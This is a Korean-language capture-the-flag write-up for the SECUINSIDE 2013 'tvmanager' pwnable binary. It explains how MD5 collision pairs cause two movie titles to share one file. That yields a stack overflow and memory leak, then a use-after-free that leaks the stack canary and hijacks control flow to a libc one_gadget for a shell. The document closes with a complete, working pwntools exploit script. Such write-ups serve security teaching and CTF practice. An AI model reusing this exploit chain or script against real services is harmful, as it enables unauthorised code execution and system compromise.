+++
title = "SECUINSIDE CTF 2013 - tvmanager"
date = "2024-07-23"
description = "SECUINSIDE CTF 2013 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "md5", "bof", "uaf", "one gadget"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/tvmanager'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Structure
``` c
struct movie {
    int size;
    int category;
    char *name;
    struct movie *next;
    struct movie *prev;
}
```

### Concept
``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ...
  read(0, name, 0x20u);
  name_len = strlen(name);
  md5_1FAE((int)name, name_len, (int)name_md5);
  sprintf(src, "/home/tvmanager/%s", name_md5);
  mkdir(src, 0x1F0u);
  if ( chdir(src) != -1 ) {
    while ( 1 ) {
    load_movies_145F();
      print_list_214E((int)menu_list_409C);
      printf("> ");
      _isoc99_scanf("%d", &choice);
      if ( choice == 1 ) list_1821();
      if ( choice == 2 ) register_18B0();
      if ( choice == 3 ) broadcast_1DA7();
      if ( choice == 4 ) exit(0);
    }
  }
  return -1;
}
```
입력받은 이름을 `md5`로 hash해서 경로를 만들고, `movie`를 등록할 때 마다 그 밑에 `movie->name`의 hash값으로 파일을 만들어 내용을 저장한다.

## 0x01. Vulnerability
### MD5 collision
여러 가지 취약점이 존재하고 그것들을 종합해서 exploit을 해야하는데 그 중 가장 먼저 봐야할 것이 MD5 collision이다.

collision이란 입력한 문자열이 다른데 hash한 값이 같은 현상을 말하며, 이 입력값 한 쌍을 충돌쌍이라고 한다.

구글링해서 찾은 예시로는 다음이 있다.
``` python
# md5 collision - 79054025255fb1a26e4bc422aef54eb4
a1 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70')
a2 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70')
```

얼추 비슷해보이지만 자세히 보면 중간중간 몇 바이트가 다르다.

여담으로 **중간중간 다른 몇 바이트**가 `\x00`이나 `\xff`일 경우 문제 내에서 `strcpy()`나 `fread()`를 하는 과정에서 끊기기 때문에 상당히 골치아파지는데, 이를 잘 피해서 충돌쌍을 구하는 것이 좋다.

이렇게 hash값이 같은 충돌쌍을 이름으로 `movie`를 등록하게 되면,
``` c
int register_18B0()
{
  ...
  printf("Input title of movie > ");
  read(0, src, 256u);
  ...
    if ( !strcmp(movie_ptr->name, src) )
    {
      puts("[-] Duplicate title");
      return -1;
    }
    ...
      name_ptr = (size_t)malloc(src_len + 1);
      movie_new = (struct movie *)malloc(0x14u);
      movie_new->name = (char *)name_ptr;
      strcpy(movie_new->name, src);
      name_len = strlen(movie_new->name);
      md5_1FAE((int)movie_new->name, name_len, (int)src);
      fd = fopen(src, "wb");
      fwrite(contents, 1u, movie_new->size, fd);
      fclose(fd);
    ...
}
```
입력한 문자열은 다르기 때문에 `strcmp(movie_ptr->name, src)` 검사는 통과하게 되고,

hash한 값은 같기 때문에 `fd = fopen(src, "wb")`에서 같은 파일을 열게 된다.

이러면 다음 취약점을 trigger할 수 있다.

### Stack Overflow & Leak
첫 번째 `movie_1`의 `size`는 0x4, 두 번째 `movie_2`의 `size`는 0x1000으로 생성했다고 가정하자.
``` c
int broadcast_1DA7()
{
  ...
  char stack_buf[1024]; // [esp+24h] [ebp-414h] BYREF
  size_t size; // [esp+424h] [ebp-14h]
  void *contents; // [esp+428h] [ebp-10h]
  unsigned int canary; // [esp+42Ch] [ebp-Ch]
  ...
    canary = __readgsdword(0x14u);
    md5_1FAE((int)movie_ptr->name, v1, (int)src);
    fd = fopen(src, "rb");
    if ( size > 0x3ff ) {
      contents = malloc(size + 1);
      fread(contents, 1u, size, fd);
      sock_send_2038(contents, movie_ptr->size);
    }
    else {
      for ( i = 0; ; ++i )
      {
        tmp = fgetc(fd);
        if ( tmp == (char)'\xFF' )
          break;
        stack_buf[i] = tmp;
      }
      sock_send_2038(stack_buf, movie_ptr->size);
    }
  ...
}
```
그러면 `movie_1`로 `broadcast`를 했을 때 `size`가 0x4이므로 `stack_buf`에 파일 내용을 읽어 한 바이트씩 복사하게 된다.

그런데 `movie_1`을 생성하고 `movie_2`를 생성했으므로 현재 파일에는 0x1000바이트 길이의 내용이 쓰여져 있을 것이다.

위 코드에서는 `\xff`가 나올 때까지 `stack_buf`에 복사를 하므로 `stack_buf` 뒤의 `size`, `contents`는 물론 `return address`까지도 덮을 수 있다.

이렇게 아예 overflow를 내버리거나 다른 값들을 leak할 수 있는데, 이번에는 `movie_1`의 `size`는 0x3ff, `movie_2`의 `size`는 0x400으로 생성한 상황을 가정해보자.

이 때 `movie_2`의 내용 첫 바이트를 `\xff`로 한다면 바로 복사가 종료되어 한 바이트도 바꾸지 않은 stack의 상황을 볼 수 있다.
``` bash
gef➤  x/4wx $esp+0x24
0xffffd864:     0x5655b6a0      0x5655b210      0x41414141      0x41414141
...
0xffffdc70:     0xf7dde000      0xf7dde000      0xffffdcf8      0x56556438
```
복사를 하는 시점의 stack 값들을 보면 다른 동작을 하다가 쓰여진 매력적인 값들이 많이 있는데, 한 번의 leak으로 `stack`, `libc`, `code`, `heap` 영역에 대한 leak이 가능하다.

문제는 `canary`인데, 이 때문에 stack leak이 필요하지만 `movie_1`의 `size`가 0x3ff보다 크면 취약점이 성립하지 않으므로 이 방법으로는 불가능하다.

따라서 다른 취약점이 필요하다.

### Use-After-Free
``` c
int broadcast_1DA7()
{
  ...
  char stack_buf[1024]; // [esp+24h] [ebp-414h] BYREF
  size_t size; // [esp+424h] [ebp-14h]
  void *contents; // [esp+428h] [ebp-10h]
...
      for ( i = 0; ; ++i )
      {
        tmp = fgetc(fd);
        if ( tmp == (char)'\xFF' )
          break;
        stack_buf[i] = tmp;
      }
    ...
    if ( size > 0x3ff )
      free(contents);
    ...
}
```
직전의 stack overflow 취약점을 이용하면 `size`와 `contents`를 조작할 수 있다.

마찬가지로 직전의 leak을 잘 수행했다면 heap에 대한 주소값이 있으므로, `size`를 0x3ff보다 큰 값으로 조작하고 offset을 계산해서 `contents`값을 조작하면 heap의 아무 chunk나 `free()`할 수 있게된다.

이렇게 `free`된 chunk는 bin으로 가서 같은 사이즈의 `malloc()`요청이 있을 때 그대로 사용되므로 우리가 원하는 길이만큼 `malloc()`을 할 수 있는 부분을 찾아보면,
``` c
int register_18B0()
{
  ...
  read(0, src, 256u);
      ...
      name_ptr = (size_t)malloc(src_len + 1);
      movie_new->name = (char *)name_ptr;
      strcpy(movie_new->name, src);
      ...
}
```
`register()`에서 `movie`의 이름을 저장하기 위한 `name_ptr`의 사이즈를 우리가 조절할 수 있고, 내용도 입력할 수 있다.

따라서 UAF 취약점이 발생하게 되며, 이를 이용해서 `canary`를 leak할 것이다.

이후에는 다시 stack overflow 취약점을 이용해서 eip control을 하면 된다.

## 0x02. Exploit
가장 먼저 할 것은 md5 collision을 이용한 stack leak이다.
``` python
    # md5 collision - 79054025255fb1a26e4bc422aef54eb4
    a1 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70')
    a2 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70')

    # stack, heap, libc leak
    register(s, a1, 1, 0x3ff, b"A" * 0x3ff)          # index 1
    register(s, a2, 1, 0x400, b"\xff" * 0x400)       # index 2

    l = listen(7777)
    broadcast(s, 1, 0, 1, 7777)
    r = l.recv()
```
이렇게 `movie_1`을 0x3ff, `movie_2`를 0x400으로 생성하고 `movie_2`의 내용을 `\xff`으로 만들어서 한 바이트도 복사를 하지 않게끔 구성하면, `stack_buf`로부터 0x3ff 바이트의 오염되지 않은 stack leak이 가능하다.

여기에서 내용을 그냥 출력해주는 것이 아닌 `broadcast`로 IP, port를 지정해서 socket으로 보내주기 때문에 `pwntools`의 `listen()`을 사용했다.
``` bash
[+] Trying to bind to :: on port 7777: Done
[+] Waiting for connections on :::7777: Got connection from ::ffff:172.17.0.2 on port 39690
[*] heap : 0x5655a000
[*] stack : 0xffffdc48
[*] libc : 0xf7c2b000
```
이제 leak된 값들을 바탕으로 UAF를 trigger해야하는데, 사실상 같은 취약점을 사용하지만 충돌쌍을 재활용하는 것이 어려우므로 새로운 충돌쌍을 사용했다.
``` python
    # md5 collision - cee9a457e790cf20d4bdaa6d69f01e41
    b1 = bytes.fromhex('0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef')
    b2 = bytes.fromhex('0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef')

    # free(movie_1)
    register(s, b1, 1, 0x4, b"BBBB")                # index 3
    payload = b"C" * 0x400                          # buf
    payload += p32(0x400)                           # size
    payload += p32(heap + 0x11f8)                   # contents, movie_1
    register(s, b2, 1, len(payload), payload)       # index 4

    broadcast(s, 3, 0, 1, 7777)
```
위 payload과 같이 `free`를 위해 `size`를 0x400으로 조작했고 `movie_1`을 free하기 위해 `contents` 값을 조작했다.

이 `free`된 chunk를 다시 할당받기 위해서,
``` python
    # canary leak
    payload = b"DDDD"                   # size
    payload += b"\xff\xff\xff\xff"      # category
    payload += p32(stack + 0xa5)        # name, canary
    payload += p32(heap + 0x16a0)       # next, movie_2
    payload += b"EEE\x00"               # prev
    register(s, payload, 1, 0x4, b"XXXX")           # index 5
```
`name`이 `struct movie`와 같은 구조가 되게끔 payload를 작성해서 `register`를 실행했다.

이 때 `category` 값을 그냥 1로 하려고 했는데 `strcpy(movie_new->name, src);`를 통해서 `name`에 복사되기 때문에 중간에 `\x00`이 있으면 뒤 payload가 짤리게 된다.

그렇다고 `category` 값을 0x41414141과 같은 dummy 값으로 채우면 leak을 위해서 실행하는 `list`에서 OOB 에러가 발생한다.
``` c
int list_1821()
{
  ...
  while ( movie_ptr )
  {
    printf("%d )\nTitile : %s\nCategory : %s\n", count + 1, movie_ptr->name, category_list_40B0[movie_ptr->category]);
    movie_ptr = (struct movie *)movie_ptr->next_movie;
    ++count;
  }
  ...
}
```
그래서 -1을 의미하는 `\xff\xff\xff\xff`로 덮어서 두 제약을 한 번에 해결했다.

이 상태로 `list`를 호출하면 `movie_ptr->name`이 canary의 주소를 가리키므로 canary leak이 가능하다.
``` bash
[*] canary : 0x72657400
```
이제 필요한 모든 정보를 가지고 있으므로 eip control이 가능하고, 실행시킬 곳은 one_gadget을 통해서 쓸만한 주소로 설정했다.

그러면 최종 payload는 다음과 같다.
``` python
    # md5 collision - fe6c446ee3a831ee010f33ac9c1b602c
    c1 = bytes.fromhex('3775C1F1C4A75AE79CE0DE7A5B10802602ABD939C96C5F0212C27FDACD0DA3B08CEDFAF3E1A3FDB4EF09E7FBB1C3991DCD91C845E66EFD3DC7BB61523EF4E03849118569EBCC179C934F40EB3302AD20A4092DFB15FA201DD1DB17CDDD29591E39899EF679469FE68B85C5EFDE424F46C278759D8B65F450EA21C5591862FF7B')
    c2 = bytes.fromhex('3775C1F1C4A75AE79CE0DE7A5B10802602ABD9B9C96C5F0212C27FDACD0DA3B08CEDFAF3E1A3FDB4EF09E7FBB1439A1DCD91C845E66EFD3DC7BB61D23EF4E03849118569EBCC179C934F40EB3302AD20A4092D7B15FA201DD1DB17CDDD29591E39899EF679469FE68B85C5EFDEC24E46C278759D8B65F450EA21C5D91862FF7B')

    # eip control
    register(s, c1, 1, 0x4, b"FFFF")                # index 6
    payload = b"G" * 0x400              # buf
    payload += p32(0)                   # size
    payload += p32(0)                   # contents
    payload += p32(canary)              # canary
    payload += b"H" * 0xc               # dummy
    payload += p32(libc + 0x5fbd5)      # return
    register(s, c2, 1, len(payload), payload)       # index 7

    broadcast(s, 6, 0, 1, 7777)
```
여기에서도 마찬가지로 새로운 충돌쌍이 필요하고 leak한 libc 주소에 one shot 가젯의 offset을 더해서 `return address`에 써주면 쉘을 획득할 수 있다.

## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
import sys, os, socket, threading

DEBUG = True
BINARY = "tvmanager"
LIBRARY = "libc-2.23.so"

code_base = 0x56555000
movie_4100 = 0x56559100
src_4120 = 0x56559120
bp = {
    'read_of_main' : code_base + 0x134B,
    'scanf_of_main' : code_base + 0x13F7,
    'load_movies' : code_base + 0x145F,
    'list' : code_base + 0x1821,
    'register' : code_base + 0x18B0,
    'md5_of_register' : code_base + 0x1BB1,
    'strlen_of_register' : code_base + 0x1B17,
    'broadcast' : code_base + 0x1DA7,
    'malloc_of_broadcast' : code_base + 0x1F1F,
    'end_of_broadcast' : code_base + 0x1FAC,
    'sizecheck_of_broadcast' : code_base + 0x1F86,
}
gs = f'''
b *{bp['scanf_of_main']}
b *{bp["end_of_broadcast"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def login(s, name):
    s.recvuntil(b"> ")
    s.send(name)
    return s.recvuntil(b"> ")

def _list(s):
    s.sendline(b"1")
    sleep(0.1)
    return s.recvuntil(b"> ")

def register(s, title, category, size, contents):
    s.sendline(b"2")
    s.recvuntil(b"> ")
    s.send(title)
    s.recvuntil(b"> ")
    s.sendline(str(category).encode())
    s.recvuntil(b"> ")
    s.send(str(size).encode())
    sleep(0.1)
    s.send(contents)
    return s.recv()

def broadcast(s, index, floor, room, channel):
    s.sendline(b"3")
    s.recvuntil(b"> ")
    s.sendline(str(index).encode())
    s.recvuntil(b"> ")
    s.sendline(f"{floor}-{room}-{channel}".encode())
    return s.recv(timeout=5)

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen(f"sudo docker top {BINARY} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    login(s, os.urandom(4))
    # md5 collision - 79054025255fb1a26e4bc422aef54eb4
    a1 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70')
    a2 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70')
    # md5 collision - cee9a457e790cf20d4bdaa6d69f01e41
    b1 = bytes.fromhex('0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef')
    b2 = bytes.fromhex('0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef')
    # md5 collision - fe6c446ee3a831ee010f33ac9c1b602c
    c1 = bytes.fromhex('3775C1F1C4A75AE79CE0DE7A5B10802602ABD939C96C5F0212C27FDACD0DA3B08CEDFAF3E1A3FDB4EF09E7FBB1C3991DCD91C845E66EFD3DC7BB61523EF4E03849118569EBCC179C934F40EB3302AD20A4092DFB15FA201DD1DB17CDDD29591E39899EF679469FE68B85C5EFDE424F46C278759D8B65F450EA21C5591862FF7B')
    c2 = bytes.fromhex('3775C1F1C4A75AE79CE0DE7A5B10802602ABD9B9C96C5F0212C27FDACD0DA3B08CEDFAF3E1A3FDB4EF09E7FBB1439A1DCD91C845E66EFD3DC7BB61D23EF4E03849118569EBCC179C934F40EB3302AD20A4092D7B15FA201DD1DB17CDDD29591E39899EF679469FE68B85C5EFDEC24E46C278759D8B65F450EA21C5D91862FF7B')

    # stack, heap, libc leak
    register(s, a1, 1, 0x3ff, b"A" * 0x3ff)         # index 1
    register(s, a2, 1, 0x400, b"\xff" * 0x400)      # index 2

    l = listen(7777)
    broadcast(s, 1, 0, 1, 7777)
    r = l.recv()

    heap = u32(r[0:4]) - 0x16a0
    stack = u32(r[0x324:0x328])
    libc = u32(r[0x320:0x324]) - 0x1b3da7
    log.info(f"heap : {hex(heap)}")
    log.info(f"stack : {hex(stack)}")
    log.info(f"libc : {hex(libc)}")

    # free(movie_1)
    register(s, b1, 1, 0x4, b"BBBB")                # index 3
    payload = b"C" * 0x400              # buf
    payload += p32(0x400)               # size
    payload += p32(heap + 0x11f8)       # contents, movie_1
    register(s, b2, 1, len(payload), payload)       # index 4

    broadcast(s, 3, 0, 1, 7777)

    # canary leak
    payload = b"DDDD"                   # size
    payload += b"\xff\xff\xff\xff"      # category
    payload += p32(stack + 0xa5)        # name
    payload += p32(heap + 0x16a0)       # next
    payload += b"EEE\x00"               # prev
    register(s, payload, 1, 0x4, b"XXXX")           # index 5

    r = _list(s)
    canary = u32(b"\x00" + r[0x3a:0x3d])
    log.info(f"canary : {hex(canary)}")

    # eip control
    register(s, c1, 1, 0x4, b"FFFF")                # index 6
    payload = b"G" * 0x400              # buf
    payload += p32(0)                   # size
    payload += p32(0)                   # contents
    payload += p32(canary)              # canary
    payload += b"H" * 0xc               # dummy
    payload += p32(libc + 0x5fbd5)      # return
    register(s, c2, 1, len(payload), payload)       # index 7
    
    broadcast(s, 6, 0, 1, 7777)
    
    s.interactive()

if __name__=='__main__':
    main()
```